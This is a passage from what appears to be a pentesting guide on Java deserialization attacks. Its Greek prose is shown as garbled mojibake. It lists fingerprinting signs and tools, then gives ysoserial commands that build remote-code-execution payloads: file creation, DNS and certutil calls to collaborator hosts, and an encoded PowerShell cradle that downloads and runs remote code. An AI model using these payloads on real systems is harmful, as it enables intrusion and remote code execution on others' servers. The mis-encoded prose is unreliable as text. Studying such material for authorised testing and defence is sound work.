Î£Ï„Î¹Ï‚ ÎµÏ€ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î® Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Î£Ï„Î·Î½ Java, **Î¿Î¹ callbacks Î±Ï€Î¿ deserialization ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï„Î·Ï‚ deserialization**. Î‘Ï…Ï„Î® Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î±Ï€ÏŒ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Ï€Î¿Ï… ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î¬Î¶Î¿Ï…Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± payloads Ï€Î¿Ï… ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ callbacks, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ Ï€Î¹Î¸Î±Î½Î® ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÏ€Î¹Î²Î»Î±Î²ÏÎ½ ÎµÎ½ÎµÏÎ³ÎµÎ¹ÏÎ½.

### Î”Î±ÎºÏ„Ï…Î»Î¹ÎºÎ¬ Î±Ï€Î¿Ï„Ï…Ï€ÏÎ¼Î±Ï„Î±

#### Î›ÎµÏ…ÎºÏŒ ÎšÎ¿Ï…Ï„Î¯

Î“Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ serialization ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±, Î±Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ:

* ÎšÎ»Î¬ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î· Î´Î¹ÎµÏ€Î±Ï†Î® `Serializable`.
* Î§ÏÎ®ÏƒÎ· Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Î”ÏÏƒÏ„Îµ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ· Ï€ÏÎ¿ÏƒÎ¿Ï‡Î® ÏƒÎµ:

* `XMLDecoder` Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Îµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ Ï€Î¿Ï… Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¿ÏÏ‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.
* Î— Î¼Î­Î¸Î¿Î´Î¿Ï‚ `fromXML` Ï„Î¿Ï… `XStream`, ÎµÎ¹Î´Î¹ÎºÎ¬ Î±Î½ Î· Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… XStream ÎµÎ¯Î½Î±Î¹ Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ· Î® Î¯ÏƒÎ· Î¼Îµ 1.46, ÎºÎ±Î¸ÏÏ‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ Î¶Î·Ï„Î®Î¼Î±Ï„Î± serialization.
* `ObjectInputStream` ÏƒÎµ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏŒ Î¼Îµ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ `readObject`.
* Î¥Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ ÏŒÏ€Ï‰Ï‚ `readObject`, `readObjectNodData`, `readResolve`, Î® `readExternal`.
* `ObjectInputStream.readUnshared`.
* Î“ÎµÎ½Î¹ÎºÎ® Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `Serializable`.

#### ÎœÎ±ÏÏÎ¿ ÎšÎ¿Ï…Ï„Î¯

Î“Î¹Î± Î´Î¿ÎºÎ¹Î¼Î­Ï‚ Î¼Î±ÏÏÎ¿Ï… ÎºÎ¿Ï…Ï„Î¹Î¿Ï, Î±Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ **Ï…Ï€Î¿Î³ÏÎ±Ï†Î­Ï‚ Î® "Magic Bytes"** Ï€Î¿Ï… Î´Î·Î»ÏÎ½Î¿Ï…Î½ java serialized objects (Ï€ÏÎ¿ÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î± Î±Ï€ÏŒ `ObjectInputStream`):

* Î•Î¾Î±Î´Î¹ÎºÏŒ Î¼Î¿Ï„Î¯Î²Î¿: `AC ED 00 05`.
* ÎœÎ¿Ï„Î¯Î²Î¿ Base64: `rO0`.
* HTTP response headers Î¼Îµ `Content-type` ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ `application/x-java-serialized-object`.
* Î•Î¾Î±Î´Î¹ÎºÏŒ Î¼Î¿Ï„Î¯Î²Î¿ Ï€Î¿Ï… Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·: `1F 8B 08 00`.
* ÎœÎ¿Ï„Î¯Î²Î¿ Base64 Ï€Î¿Ï… Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·: `H4sIA`.
* Î™ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· `.faces` ÎºÎ±Î¹ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `faces.ViewState`. Î— Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î¼Î¿Ï„Î¯Î²Ï‰Î½ ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÎ¾Î­Ï„Î±ÏƒÎ· ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ [Î±Î½Î¬ÏÏ„Î·ÏƒÎ· ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Deserialization Ï„Î¿Ï… Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿

Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± **Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î¼Î¹Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Java Deserialized** Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏÎ¯Î¾ÎµÏ„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÎµ [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), ÎºÎ±Î¹ [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### Î”Î¿ÎºÎ¹Î¼Î® White Box

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î· ÎºÎ¬Ï€Î¿Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î¼Îµ Î³Î½Ï‰ÏƒÏ„Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ ÎºÎ±Î¹ ÏŒÏ„Î¹ Ï„Î¿ [**Ysoserial**](https://github.com/frohoff/ysoserial) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¼Î¹Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·. Î‰ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) Î³Î¹Î± Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Ï€Î¹Î¸Î±Î½Î­Ï‚ Î±Î»Ï…ÏƒÎ¯Î´ÎµÏ‚ gadget Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½.\
ÎŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ Ï„Î¿ **gadgetinspector** (Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î® Ï„Î¿Ï…) Î¼Î·Î½ Î±Î½Î·ÏƒÏ…Ï‡ÎµÎ¯Ï„Îµ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Ï„ÏŒÎ½Î¿Ï…Ï‚ Ï€ÏÎ¿ÎµÎ¹Î´Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½/ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰Î½ Ï€Î¿Ï… Ï€ÎµÏÎ½Î¬ÎµÎ¹ ÎºÎ±Î¹ Î±Ï†Î®ÏƒÏ„Îµ Ï„Î¿ Î½Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¸ÎµÎ¯. Î˜Î± Î³ÏÎ¬ÏˆÎµÎ¹ ÏŒÎ»Î± Ï„Î± ÎµÏ…ÏÎ®Î¼Î±Ï„Î± ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î¿ _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Î Î±ÏÎ±ÎºÎ±Î»Ï, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **Ï„Î¿ gadgetinspector Î´ÎµÎ½ Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ ÏˆÎµÏ…Î´ÏÏ‚ Î¸ÎµÏ„Î¹ÎºÎ¬ Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î±**.

#### Black Box Test

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ **Ï€Î¿Î¹Î± Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚** (ÎºÎ±Î¹ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï…Ï‚). ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ **ÎµÏ…ÎºÎ¿Î»ÏŒÏ„ÎµÏÎ¿ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Î­Î½Î± payload** Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.\
[**Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Ï„Î¿ GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
Î¤Î¿ GadgetProbe ÎµÏ€Î¹ÎºÎµÎ½Ï„ÏÏÎ½ÎµÏ„Î±Î¹ ÏƒÎµ **`ObjectInputStream` deserializations**.

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ Î¼Îµ Ï„Î¿ ysoserial ÎºÎ±Î¹ Î½Î± **Ï„Î¹Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ**.\
[**Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Ï„Î¿ Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
ÎŸ Java Deserialization Scanner ÎµÏ€Î¹ÎºÎµÎ½Ï„ÏÏÎ½ÎµÏ„Î±Î¹ ÏƒÎµ **`ObjectInputStream`** deserializations.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ [**Freddy**](https://github.com/nccgroup/freddy) Î³Î¹Î± Î½Î± **ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ deserialization** ÏƒÏ„Î¿ **Burp**. Î‘Ï…Ï„ÏŒ Ï„Î¿ plugin Î¸Î± Î±Î½Î¹Ï‡Î½ÎµÏÏƒÎµÎ¹ **ÏŒÏ‡Î¹ Î¼ÏŒÎ½Î¿ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Î¼Îµ Ï„Î¿ `ObjectInputStream`** Î±Î»Î»Î¬ **ÎºÎ±Î¹** ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î±Ï€ÏŒ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ deserialization **Json** ÎºÎ±Î¹ **Yml**. Î£Îµ ÎµÎ½ÎµÏÎ³ÏŒ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±, Î¸Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± Ï„Î¹Ï‚ ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎµÎ¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ payloads sleep Î® DNS.\
[**ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ Freddy ÎµÎ´Ï.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Î”ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏŒÎ»Î± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎºÎ¬Ï€Î¿Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®. ÎœÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ serialized object ÎºÎ±Î¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚** (Î¯ÏƒÏ‰Ï‚ Î½Î± ÏƒÎ±Ï‚ Î´ÏÏƒÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± webapp).\
Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± java serialized object Ï€Î¿Ï… Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¹Î± web ÎµÏ†Î±ÏÎ¼Î¿Î³Î®, **Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **Î³Î¹Î± Î½Î± ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÏ„Îµ Î¼Îµ Ï€Î¹Î¿ Î±Î½Î¸ÏÏÏ€Î¹Î½Î± Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î· Î¼Î¿ÏÏ†Î® Ï„Î¿ serialization object Ï€Î¿Ï… Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹**. Î“Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï€Î¿Î¹Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î­Î»Î½ÎµÏ„Îµ Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿ Î½Î± Ï„Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚.

### **Exploit**

#### **ysoserial**

Î¤Î¿ ÎºÏÏÎ¹Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Ï‰Î½ Java deserializations ÎµÎ¯Î½Î±Î¹ Ï„Î¿ [**ysoserial**](https://github.com/frohoff/ysoserial) ([**ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ ÎµÎ´Ï**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÎ¾ÎµÏ„Î¬ÏƒÎµÏ„Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) Ï€Î¿Ï… Î¸Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏƒÏÎ½Î¸ÎµÏ„ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ (Î¼Îµ pipes Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±).\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ **ÎµÏƒÏ„Î¹Î±ÏƒÎ¼Î­Î½Î¿** ÏƒÏ„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï… **`ObjectInputStream`**.\
Î˜Î± **Î¾ÎµÎºÎ¹Î½Î¿ÏÏƒÎ± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ payload "URLDNS"** **Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Î­Î½Î± RCE** payload Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ‰ Î±Î½ Î· Î­Î½ÎµÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î®. ÎŸÏÏ„Ï‰Ï‚ Î® Î¬Î»Î»Ï‰Ï‚, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¯ÏƒÏ‰Ï‚ Ï„Î¿ payload "URLDNS" Î½Î± Î¼Î·Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Î»Î»Î¬ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¬Î»Î»Î¿ RCE payload Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
